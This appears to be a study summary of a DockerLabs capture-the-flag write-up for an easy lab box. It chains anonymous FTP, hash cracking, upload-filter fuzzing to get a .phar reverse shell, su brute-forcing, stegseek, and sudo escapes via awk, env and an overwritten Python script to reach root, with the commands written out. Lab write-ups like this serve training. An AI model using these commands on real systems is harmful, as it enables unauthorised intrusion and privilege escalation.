---
type: machine
platform: dockerlabs
difficulty: easy
ip: 172.17.0.2
cves: []
tools: [nmap, ftp, john-the-ripper, gobuster, ffuf, curl, wget, netcat, steghide, stegseek]
techniques: [information-gathering, ftp-anonymous-login, hash-cracking, directory-fuzzing, web-shell-upload, reverse-shells, su-brute-force, steganography, sudo-abuse]
tags: [ejpt:assessment, ejpt:web-pentest, ejpt:host-net-pentest]
related: ["[[web-shell-upload]]", "[[steganography]]", "[[su-brute-force]]", "[[sudo-abuse]]"]
---

# File

**Writeup:** [raw writeup](../../writeups/dockerlabs/easy/file.md)

An upload-filter box with a four-hop lateral chain. Anonymous FTP hands you a bare hash; the web root hands you a *form*; the answer to "what may I upload?" is found by fuzzing a filename until one response is a size different from all the others — and it isn't `.php`. Then four local users fall in order, each unlocked by a different technique: spray, stego, `awk`, `env`, and finally a pinned Python script.

```
Kali (172.17.0.1) ─ 172.17.0.0/16 ─ file (172.17.0.2)
```

## Path

1. **Recon** — `ping -c 2` (ttl=64) then `sudo nmap -p- --open -sS --min-rate 5000 -n -Pn` → `21/80`; `-sCV` → vsftpd 3.0.5 with **anonymous login allowed** (one file: `anon.txt`, 33 B, `r--r--r--`), Apache 2.4.41 serving the **default Ubuntu page** ([[information-gathering]], [[nmap]]).
2. **FTP → a bare hash** — `ftp` → `get anon.txt` → the file is *nothing but* `53dd9c6005f3cdfc5a69c5c07388016d`. 32 hex = MD5 → `john --format=raw-MD5` → **`justin`** — a username, not a password, and nothing later in the run uses it ([[ftp-anonymous-login]], [[hash-cracking]]).
3. **Web** — `gobuster dir … -x php,html,txt` → `index.html` (the default page), **`uploads/` (301)**, `server-status` (403), **`file_upload.php` (200, 468 B)** ([[directory-fuzzing]], [[gobuster]]).
4. **Two URLs, one form** — `curl file_upload.php` returns a plain `<form action="subir_archivo.php" method="post" enctype="multipart/form-data">` with one input, `name="archivo"`. The page that *renders* the form and the endpoint that *accepts* the file are different paths — fuzz the `action=`, not the page you were handed ([[curl]]).
5. **Extension fuzz → `phar`** — `ffuf -X POST` with a hand-built multipart body (`-H "Content-Type: multipart/form-data; boundary=…"`, `-d $'…filename="revshell.FUZZ"…'`) against `extensions-most-common.fuzz.txt`, filtered with **`-fs 33`** — 33 bytes being the size of a *rejection*. Exactly one entry disagrees: **`phar`** (Status 200, **Size 50**). `.php` never surfaces at all ([[web-shell-upload]], [[ffuf]]).
6. **Shell** — upload `revshell.phar` → `curl http://172.17.0.2/uploads/revshell.phar` → `sudo nc -lvnp 4443` → **`www-data`** ([[reverse-shells]], [[netcat]]).
7. **www-data → fernando** — `cat /etc/passwd | grep /bin/bash` → `root`, `www-data`, **`fernando`, `mario`, `julen`, `iker`** — four named users is a *queue*, not a list. `wget` `Linux-Su-Force.sh` + `rockyou.txt` off Kali → `./Linux-Su-Force.sh fernando rockyou.txt` → **`chocolate`** → `su fernando` ([[su-brute-force]], [[wget]]).
8. **fernando → mario (stego)** — `ls -l` → `dragon-medieval.jpeg` (187 638 B) in fernando's home → serve it over HTTP, pull it down → **`stegseek`** brute-forces the steghide passphrase from rockyou → **`secret`** → `pass.txt` holds `cbfdac6008f9cab4083784cbd1874f76618d2a97`. 40 hex = SHA-1 → `john --format=raw-sha1 --wordlist=rockyou.txt` → **`password123`** → `su mario` ([[steganography]], [[stegseek]], [[john-the-ripper]]).
9. **mario → julen** — `sudo -l` → `(julen) NOPASSWD: /usr/bin/awk` → `sudo -u julen /usr/bin/awk 'BEGIN {system("/bin/sh")}'`.
10. **julen → iker** — `sudo -l` → `(iker) NOPASSWD: /usr/bin/env` → `sudo -u iker /usr/bin/env /bin/bash`.
11. **iker → root** — `sudo -l` → `(ALL) NOPASSWD: /usr/bin/python3 /home/iker/geo_ip.py`. The command line is pinned, so the payload goes *inside* the file it runs: `echo 'import os; os.execl("/bin/sh", "sh")' > geo_ip.py` → `sudo -u root /usr/bin/python3 /home/iker/geo_ip.py` → **root** ([[sudo-abuse]], [[gtfobins]]).

## Credentials

| Stage | Value | Source |
|-------|-------|--------|
| (unused) | `justin` | raw-MD5 in FTP `anon.txt` |
| `su fernando` | `chocolate` | `Linux-Su-Force.sh` + rockyou |
| steghide passphrase | `secret` | `stegseek` on `dragon-medieval.jpeg` |
| `su mario` | `password123` | raw-SHA1 in stego `pass.txt` → john |

## Takeaways

- **When every response is `200`, length is the only signal left.** `-fs 33` is not a 404 filter — it's the size of a *refusal*. The one entry that disagrees with the baseline (`phar`, Size 50) is the answer, and you only see it because the rejection was measured first ([[web-shell-upload]], [[ffuf]]).
- **A form page and its `action=` are different endpoints.** `file_upload.php` (468 B) only renders HTML; `subir_archivo.php` does the work. Fuzzing the path you were handed would have returned nothing.
- **Ask what the server will *run*, not what the filter will *allow*.** `.php` never appeared, but `.phar` is in PHP's default handler set — an allow-list that "isn't .php" can still hand you code execution. The interesting question is the interpreter's, not the validator's.
- **Identify a hash by length before you pick a format.** 32 hex → `raw-MD5`, 40 hex → `raw-sha1`. Both were sitting in files the box gave you, and *neither one is a password* — each unlocks the next stage ([[hash-cracking]]).
- **A steghide passphrase you don't know is still a wordlist problem.** `stegseek` runs rockyou against the carrier directly; you never had to think of `secret`. When a technique seems to need a guess, ask whether it can be *computed* instead ([[steganography]]).
- **`sudo -l` must be re-run after every uid change.** The three entries lived on three different accounts — mario's `awk`, julen's `env`, iker's `python3`. The rule you need is on the identity you just became, not the one you started with.
- **When the command line is pinned, move the payload into the file.** You can't edit the arguments to `python3 /home/iker/geo_ip.py`, but you can edit `geo_ip.py`. The script *is* the injection point ([[sudo-abuse]]).
- **`grep /bin/bash /etc/passwd` is a target list.** Four interactive users on one box meant four staged unlocks — spray → stego → sudo → sudo — and reading the list up front tells you how many hops remain.

## Gaps in the writeup

- **`justin` is never used again.** The FTP hash cracks to a username that appears nowhere else — either a deliberate red herring or an intended login the run never needed. A re-run should try it against FTP/SSH before calling it dead ([[ftp-anonymous-login]]).
- **The stego download is circular as written.** `python3 -m http.server 8000` runs in fernando's directory *on the target*, then `wget http://172.17.0.2:8000/dragon-medieval.jpeg` fetches it back from the same host — a no-op. The sensible reading is "server on the target, wget on Kali", but the writeup never says where each command executed.
- **The rejection message was never captured.** `-fs 33` tells you *that* 33 bytes means "refused", not *what* the filter said — so allow-list vs `.php`-blocklist is still undetermined, and so is whether `phar` was in the tested set at all. Record one refused response on a re-run.
